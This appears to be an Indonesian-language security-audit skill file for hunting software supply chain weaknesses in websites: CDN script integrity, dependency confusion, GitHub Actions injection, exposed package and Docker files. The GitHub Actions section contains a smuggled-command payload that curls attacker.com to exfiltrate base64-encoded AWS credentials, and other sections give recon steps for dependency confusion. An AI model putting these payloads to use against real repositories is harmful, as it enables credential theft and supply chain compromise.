---
name: hunt-supply-chain-web
description: "Hunt Software Supply Chain Failures (OWASP A03:2025 — kategori BARU, exploit score tertinggi dari semua kategori). Covers: npm/pip package compromise, dependency confusion, GitHub Actions injection, malicious CDN script, typosquatting library, poisoned docker image, dan CI/CD exposure. Gunakan saat auditing website yang pakai npm/yarn, CI/CD pipeline, atau third-party script. Supply chain = entry point semakin populer karena 1 serangan bisa kena ribuan target."
version: 1.0.0
sources: owasp-top10-2025-A03, securecodewarrior, reversinglabs, alex-birsan-dependency-confusion
---

# Hunt: Software Supply Chain Failures (OWASP A03:2025)

> OWASP A03:2025 = KATEGORI BARU dengan exploit score TERTINGGI di OWASP 2025.
> 1 package yang dikompromis bisa kena ribuan website sekaligus.
> Contoh nyata: event-stream npm package (2018), XZ Utils (2024), polyfill.io (2024).

---

## Attack Vector 1 — Malicious Third-Party Script (CDN Hijack)

Script yang dimuat dari CDN pihak ketiga bisa dikompromis.

```bash
# Step 1: Temukan semua script eksternal di halaman
curl -s https://target.com | grep -oE 'src="https?://[^"]+\.js[^"]*"'
curl -s https://target.com | grep -oE "src='https?://[^']+\.js[^']*'"

# Step 2: Identifikasi CDN yang dipakai
# Perhatikan: cdn.jsdelivr.net, unpkg.com, cdnjs.cloudflare.com
# BAHAYA: polyfill.io (dikompromis Juni 2024 → inject malware ke 100.000+ site)

# Step 3: Cek apakah ada Subresource Integrity (SRI)
# AMAN: <script src="..." integrity="sha384-..." crossorigin="anonymous">
# BAHAYA: <script src="..."> tanpa integrity hash

# Step 4: Verifikasi script yang dimuat
# Download script saat ini
curl -s "https://cdn.example.com/lib.js" > lib_current.js
# Bandingkan hash dengan yang diharapkan
sha256sum lib_current.js

# Cek isi script untuk payload mencurigakan
curl -s "https://cdn.example.com/lib.js" | grep -E "(eval|atob|document.write|XMLHttpRequest|fetch.*evil)"
```

**Real incident:** polyfill.io dikompromis Juni 2024 → inject malware ke 100.000+ website yang pakai `<script src="https://polyfill.io/v3/polyfill.min.js">`.

---

## Attack Vector 2 — Dependency Confusion

Jika package internal perusahaan namanya sama dengan yang di-upload ke npm public, npm ambil yang publik (versi lebih tinggi).

```bash
# Step 1: Temukan nama package internal dari:
# - JS bundle yang di-decompile
# - package.json yang exposed
# - Error message di console
# - Job posting (sering menyebut internal tools)

curl https://target.com/package.json
# Atau di JS bundle:
curl -s https://target.com/static/js/main.js | grep -oE '"@company/[^"]+"|"internal-[^"]+"'

# Step 2: Cek apakah nama itu ada di npm
npm search @targetcompany/internal-package-name
# Jika tidak ada → bisa di-publish dengan versi lebih tinggi

# Step 3: Cek package.json dependencies untuk nama internal
# Tanda-tanda: scope @company, nama seperti "company-utils", "company-auth"

# Step 4: Verifikasi — jika package tidak ada di npm registry
curl https://registry.npmjs.org/@targetcompany/internal-package
# Jika 404 → vulnerable to dependency confusion
```

---

## Attack Vector 3 — GitHub Actions Injection

GitHub Actions sering menulis input user langsung ke shell command.

```bash
# Target: workflow files di .github/workflows/
# Cari input yang tidak di-sanitasi

# Pattern berbahaya — string interpolation langsung
run: echo ${{ github.event.pull_request.title }}
run: echo "${{ github.event.issue.body }}"

# Cara eksploitasi: buat PR/issue dengan judul/body yang mengandung:
"; curl http://attacker.com/steal?data=$(cat ~/.aws/credentials | base64) #

# Cari workflow yang trigger dari external (pull_request_target = BERBAHAYA)
grep -r "pull_request_target" .github/workflows/
grep -r "issue_comment" .github/workflows/

# Identifikasi workflow yang exposed
curl https://api.github.com/repos/TARGET_ORG/TARGET_REPO/contents/.github/workflows
```

---

## Attack Vector 4 — Exposed Package Manager Files

```bash
# Cari package files yang exposed di web
curl https://target.com/package.json
curl https://target.com/composer.json
curl https://target.com/requirements.txt
curl https://target.com/Gemfile
curl https://target.com/go.mod

# Lock files (berisi versi exact — berguna untuk CVE matching)
curl https://target.com/package-lock.json
curl https://target.com/yarn.lock
curl https://target.com/composer.lock

# Dari lock files → extract semua dependencies → cek CVE
# npm audit terhadap package-lock.json
npm audit --json

# Cek versi library yang dipakai vs CVE database
curl https://target.com/package.json | python3 -c "
import sys,json
data=json.load(sys.stdin)
for k,v in {**data.get('dependencies',{}),**data.get('devDependencies',{})}.items():
    print(f'{k}: {v}')
"
```

---

## Attack Vector 5 — Typosquatting Library Check

Apakah target pakai library dengan nama yang mirip library populer (tapi berbeda)?

```bash
# Nama typosquatting yang pernah ada di npm
# lodash → 1odash, Iodash, loadsh
# express → expres, expresss
# react → raect, reacts

# Cek package.json target untuk typosquatting
curl -s https://target.com/package.json | jq '.dependencies | keys[]' | while read pkg; do
  echo "Checking: $pkg"
done

# Bandingkan dengan daftar typosquatting yang diketahui
# https://github.com/nickcoutsos/npm-package-hijacking
```

---

## Attack Vector 6 — Malicious Docker/Container Image

```bash
# Cek apakah ada Docker image yang exposed atau bisa di-pull
# Dockerfile yang exposed
curl https://target.com/Dockerfile
curl https://target.com/.dockerignore

# Jika tahu image yang dipakai (dari error/headers):
# Cek image digest vs yang diharapkan
docker pull targetcompany/app:latest
docker inspect targetcompany/app:latest --format='{{.Id}}'

# Scan image untuk vulnerability
trivy image targetcompany/app:latest
grype targetcompany/app:latest
```

---

## Checklist Hunt Supply Chain

```
[ ] List semua script eksternal yang dimuat (CDN, third-party)
[ ] Cek apakah ada Subresource Integrity (SRI) pada script eksternal
[ ] Verifikasi isi script CDN — ada payload mencurigakan?
[ ] Cari package.json / composer.json / requirements.txt yang exposed
[ ] Check semua dependency di lock file vs CVE database (npm audit)
[ ] Temukan nama package internal dari JS bundle atau error message
[ ] Cek apakah nama package internal ada di npm public registry
[ ] Cari .github/workflows/ jika target open source
[ ] Cek apakah ada GitHub Actions dengan pull_request_target trigger
[ ] Cek script injection di GitHub Actions workflow (string interpolation)
[ ] Verifikasi apakah polyfill.io atau CDN lama masih dipakai
[ ] Scan untuk typosquatting library di dependencies
[ ] Cek Dockerfile yang exposed
[ ] Scan Docker image dengan trivy/grype jika bisa diakses
```

---

## Tools

```bash
# npm audit — cek vulnerability di dependencies
npm audit --json > audit_results.json

# Retire.js — detect vulnerable JavaScript libraries
retire --path . --outputformat json

# OWASP Dependency Check
dependency-check --project "Target" --scan /path/to/project

# Trivy — scan container image dan filesystem
trivy fs /path/to/project
trivy image targetimage:latest

# truffleHog — cari secret di dependencies
trufflehog npm --package package-lock.json
```
